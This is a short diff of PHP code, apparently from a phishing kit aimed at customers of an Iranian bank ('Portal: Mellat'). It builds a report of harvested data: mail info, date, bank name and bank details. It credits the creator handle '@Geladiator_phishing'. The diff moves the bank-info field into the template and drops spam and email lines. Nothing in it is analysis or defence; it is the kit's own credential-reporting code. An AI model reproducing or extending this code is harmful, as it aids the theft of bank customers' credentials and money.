@@ -76,17 +76,10 @@ $mailinfo
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
--------------- $bankname --------------
+-------------- $bankname --------------$bankinfo
 ------------- Creator -------------
 🆔 : @Geladiator_phishing :)
 ";
-    
-$Text .="\n$bankinfo[0]⁉️Spam: $num";
-
-if($sendEmail==true){
-    $Text .="\n⁉️Email: $email";
-}
-
 $T="000";
 $I= 0000;
 
